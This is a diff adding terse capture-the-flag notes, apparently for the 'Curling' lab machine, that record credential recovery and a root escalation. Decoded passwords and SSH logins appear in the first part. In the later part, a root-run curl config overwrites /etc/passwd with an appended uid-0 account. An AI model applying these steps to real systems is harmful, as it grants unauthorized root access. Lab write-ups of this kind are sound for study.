@@ -1,0 +1,24 @@
+http://10.10.10.150/secret.txt == Q3VybGluZzIwMTgh
+> echo Q3VybGluZzIwMTgh | base64 -d
+Curling2018!
+
+/administrator/index.php
+Floris:Curling2018!
+
+xxd -r password_backup.xxd > pwd.bzip
+then after bzip -d $ -> file on output and keeep decompressing until you get password.txt
+
+ssh floris@10.10.10.150
+Password: 5d<wdCbdZu)|hChXll
+
+~/admin-area/input <- using curl to generate report
+cat /etc/passwd > /dev/shm/.passwd
+python3 -c 'import crypt;test = crypt.crypt("postrequest", crypt.METHOD_SHA512);print(test)'
+echo "boot:$6$tmUDFPbsbKAnmuEr$hO0QR5TmQQ8c45CTc.h4GtSmFvmfN79tPvmIP4JFNSIz/q3GGFkH8yy4ONVhbh.HEV6InCP/FnlvTSgYX9VMb.:0:0:root:/root:/bin/bash" >> /dev/shm/.passwd
+~/admin-area/input:
+	url = "file:///dev/shm/.passwd"
+	output = "/etc/passwd"
+
+su - boot
+Password: postrequest
+#
